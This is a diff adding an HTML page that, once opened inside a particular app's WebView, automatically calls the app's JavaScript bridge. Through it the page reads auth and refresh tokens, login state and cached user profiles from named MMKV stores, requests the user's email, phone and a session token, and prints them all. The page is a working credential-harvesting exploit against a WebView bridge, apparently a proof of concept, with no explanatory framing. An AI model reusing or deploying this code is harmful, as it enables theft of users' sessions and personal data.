@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>数据扫描</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 15px;
+            background-color: #f8f8f8;
+            font-size: 14px;
+        }
+        .result {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 10px;
+            margin: 10px 0;
+            white-space: pre-wrap;
+            word-break: break-all;
+            overflow-y: auto;
+            max-height: 80vh;
+        }
+        #status {
+            margin: 10px 0;
+            color: #555;
+        }
+        pre {
+            margin: 0;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <div id="status">正在扫描...</div>
+    <div class="result" id="result"></div>
+
+    <script>
+        // 存储实例
+        const MMKV_INSTANCES = ["aha_common", "AhaMMKV", "HisavanaMMKV", "wv_kv_storage", "NETWORK_CACHE_DNS", "AthenaKV"];
+        
+        // 敏感键名
+        const SENSITIVE_KEYS = [
+            // 认证相关
+            "key.auth.token", "key.auth.token.last", "key.login.formal", "key.login.type", 
+            "key.google.bind.type", "key.first.request.login.bind.type",
+            
+            // 用户相关
+            "key.cache.user.info", "key.cache.user.info.last", "key.user.first.open.aha.time", 
+            "key.select.language.short.name", "post.result.key", "user.info", "user.token",
+            "userInfo", "token", "auth.token", "auth_token", "access_token", "refresh_token",
+            
+            // 配置相关
+            "key.tpush.client.id.cache", "key.auto.update.aha", "key.game.lastPlayGameTime"
+        ];
+
+        // 结果存储
+        let foundData = {};
+        let resultDiv = document.getElementById('result');
+        let statusDiv = document.getElementById('status');
+
+        // 格式化值为字符串
+        function formatValue(value) {
+            if (value === null) return "null";
+            if (value === undefined) return "undefined";
+            
+            try {
+                // 尝试解析JSON字符串
+                if (typeof value === 'string' && (value.startsWith('{') || value.startsWith('['))) {
+                    try {
+                        const parsed = JSON.parse(value);
+                        return JSON.stringify(parsed, null, 2);
+                    } catch (e) {
+                        return value;
+                    }
+                }
+                
+                // 转换对象为JSON
+                if (typeof value === 'object') {
+                    return JSON.stringify(value, null, 2);
+                }
+                
+                return String(value);
+            } catch (e) {
+                return `[${typeof value}] (错误: ${e.message})`;
+            }
+        }
+
+        // 初始化桥接器
+        function initBridge() {
+            if (!window.a_bridge) {
+                statusDiv.textContent = "错误: JSBridge未初始化";
+                return false;
+            }
+            
+            const callbackMap = {};
+            window.bridgeCore = {
+                callBridge: function(name, params, callback) {
+                    try {
+                        const request = {
+                            method: name,
+                            uniqueId: Date.now() * 1000000 + Math.round(Math.random() * 1000000),
+                            params: params || {}
+                        };
+                        callbackMap[request.uniqueId] = callback;
+                        const response = window.a_bridge.call(JSON.stringify(request));
+                        return response;
+                    } catch(e) {
+                        console.error("callBridge error:", e);
+                        return null;
+                    }
+                },
+                callBridgeSync: function(name, params) {
+                    try {
+                        const request = {
+                            method: name,
+                            params: params || {}
+                        };
+                        const responseStr = window.a_bridge.call(JSON.stringify(request));
+                        const response = JSON.parse(responseStr);
+                        return response.data;
+                    } catch(e) {
+                        console.error("callBridgeSync error:", e);
+                        return null;
+                    }
+                },
+                receiver: function(callbackId, keepCallback, result) {
+                    if (callbackMap[callbackId]) {
+                        callbackMap[callbackId](result);
+                        if (!keepCallback) {
+                            delete callbackMap[callbackId];
+                        }
+                    }
+                }
+            };
+            
+            statusDiv.textContent = "JSBridge初始化成功";
+            return true;
+        }
+
+        // 从存储获取值
+        function getStorageData(key, flag) {
+            try {
+                let result;
+                if (flag) {
+                    result = window.bridgeCore.callBridgeSync("/storage/getPlus", {flag: flag, key: key});
+                } else {
+                    result = window.bridgeCore.callBridgeSync("/storage/get", {key: key});
+                }
+                return result;
+            } catch(e) {
+                return null;
+            }
+        }
+
+        // 尝试所有存储获取值
+        async function tryGetValueFromAllStores(key) {
+            // 直接获取
+            const directValue = getStorageData(key);
+            if (directValue) {
+                foundData[key] = directValue;
+                return directValue;
+            }
+            
+            // 尝试所有实例
+            for (const instance of MMKV_INSTANCES) {
+                const value = getStorageData(key, instance);
+                if (value) {
+                    foundData[`${instance}:${key}`] = value;
+                    return value;
+                }
+            }
+            
+            return null;
+        }
+
+        // 扫描所有键
+        async function scanAllKeys() {
+            statusDiv.textContent = "正在扫描存储数据...";
+            let foundCount = 0;
+            
+            for (let i = 0; i < SENSITIVE_KEYS.length; i++) {
+                const key = SENSITIVE_KEYS[i];
+                const value = await tryGetValueFromAllStores(key);
+                
+                if (value) {
+                    foundCount++;
+                    updateResults();
+                }
+                
+                // 避免页面冻结
+                if (i % 5 === 0) {
+                    await new Promise(resolve => setTimeout(resolve, 0));
+                }
+            }
+            
+            statusDiv.textContent = `扫描完成: 找到 ${foundCount} 个值`;
+            return foundCount;
+        }
+
+        // 获取额外API数据
+        async function getApiData() {
+            statusDiv.textContent = "正在获取API数据...";
+            
+            try {
+                // 环境信息
+                const envInfo = window.bridgeCore.callBridgeSync("/session/env", {});
+                if (envInfo) {
+                    foundData["session.env"] = envInfo;
+                }
+                
+                // HTTP头
+                const headers = window.bridgeCore.callBridgeSync("/api/headers", {});
+                if (headers) {
+                    foundData["api.headers"] = headers;
+                }
+                
+                // 用户基本信息
+                const basicInfo = window.bridgeCore.callBridgeSync("/business/basicInfo", {
+                    request: ["avatar", "nickname", "gender", "birthday", "userId", "email", "phone"]
+                });
+                if (basicInfo) {
+                    foundData["business.basicInfo"] = basicInfo;
+                }
+                
+                // token
+                await new Promise(resolve => {
+                    window.bridgeCore.callBridge("/business/getSToken", {type: 1}, function(response) {
+                        if (response && response.code === 0) {
+                            foundData["business.getSToken"] = response.data;
+                            updateResults();
+                        }
+                        resolve();
+                    });
+                    
+                    setTimeout(resolve, 2000);
+                });
+                
+                updateResults();
+            } catch (e) {
+                console.error("API调用错误:", e);
+            }
+        }
+
+        // 更新结果显示
+        function updateResults() {
+            let resultHtml = '';
+            const foundCount = Object.keys(foundData).length;
+            
+            if (foundCount === 0) {
+                resultHtml = '未找到任何数据';
+            } else {
+                for (const key in foundData) {
+                    const value = foundData[key];
+                    if (value !== null && value !== undefined && value !== '') {
+                        resultHtml += `<strong>${key}</strong>: <pre>${formatValue(value)}</pre>\n\n`;
+                    }
+                }
+            }
+            
+            resultDiv.innerHTML = resultHtml;
+        }
+
+        // 主函数
+        async function main() {
+            if (!initBridge()) {
+                setTimeout(main, 500);
+                return;
+            }
+            
+            // 扫描存储
+            await scanAllKeys();
+            
+            // 获取API数据
+            await getApiData();
+            
+            statusDiv.textContent = "扫描完成";
+        }
+
+        // 页面加载后自动开始
+        window.onload = main;
+    </script>
+</body>
+</html>
